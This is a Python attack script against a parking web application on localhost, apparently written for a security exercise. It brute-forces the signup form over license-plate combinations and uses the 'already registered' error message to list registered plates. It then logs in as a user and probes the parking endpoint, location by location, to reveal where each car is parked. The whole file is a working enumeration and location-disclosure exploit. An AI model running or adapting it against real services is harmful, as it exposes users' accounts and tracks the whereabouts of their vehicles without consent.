from rich import print, inspect
from tqdm import tqdm
import requests as r
import itertools
import typing
import re


def find_registered_plates():
    register_url = "http://localhost:3000/signup"
    payload = {
        "username": "malarkey",
        "password": "123",
        "password2": "234"
    }
    VALID_DIGITS = "ABCDE123456789"

    plates = itertools.combinations_with_replacement(VALID_DIGITS, 6)
   #  plates = ["ACDC66", "ABC123", "111111", "AAA123", "AAA111"]
    used_plates = []
    for p in tqdm(plates, total=pow(14,6)):
        payload["plate"] = p
        res = r.post(register_url, data=payload)
        if re.search("License plate already",res.text, re.MULTILINE):
            used_plates.append(p)
            print(f"Found Registered Plate: {p}")

    return used_plates

def find_car_location(session, plate):
    park_url = "http://localhost:3000/park"
    locations = {
        "Gamla Stan": "662b6f5a99c41e005eb040f6",
        "Royal Palace of Stockholm": "662b6f5a99c41e005eb040f7",
        "Vasa Museum": "662b6f5a99c41e005eb040f8",
        "Skansen Open-Air Museum": "662b6f5a99c41e005eb040f9",
        "Gröna Lund Amusement Park": "662b6f5a99c41e005eb040fa",
        "Stockholm City Hall": "662b6f5a99c41e005eb040fb",
        "Fotografiska": "662b6f5a99c41e005eb040fc",
        "ABBA The Museum": "662b6f5a99c41e005eb040fd",
        "National Museum of Sweden": "662b6f5a99c41e005eb040fe",
        "Ericsson Globe": "662b6f5a99c41e005eb040ff",
        "Stadshuset Restaurant": "662b6f5a99c41e005eb04100",
        "Östermalm Saluhall": "662b6f5a99c41e005eb04101",
        "Djurgården Island": "662b6f5a99c41e005eb04102",
        "The ABBA Tribute Museum": "662b6f5a99c41e005eb04103",
        "Kungsträdgården Park": "662b6f5a99c41e005eb04104",
        "Nobel Museum": "662b6f5a99c41e005eb04105",
        "Moderna Museet": "662b6f5a99c41e005eb04106",
        "Tantolunden Park": "662b6f5a99c41e005eb04107"
    }
    payload = {
        "licensePlate": plate,
        "minTime": 1
    }
    for (k,v) in locations.items():
        payload["location"] = v
        res = session.post(park_url, data=payload)
        if re.search("This car is already parked in the selected location", res.text, re.MULTILINE):
            print(f"Car {plate} is parked at {k}")


if __name__ == "__main__":
    registered_plates = find_registered_plates()
    print("Scraped all plates")
    ses = r.Session()
    ses.post("http://localhost:3000/login", data = {"username": "bob", "password": "123"})
    for p in registered_plates:
        find_car_location(ses, p)
    
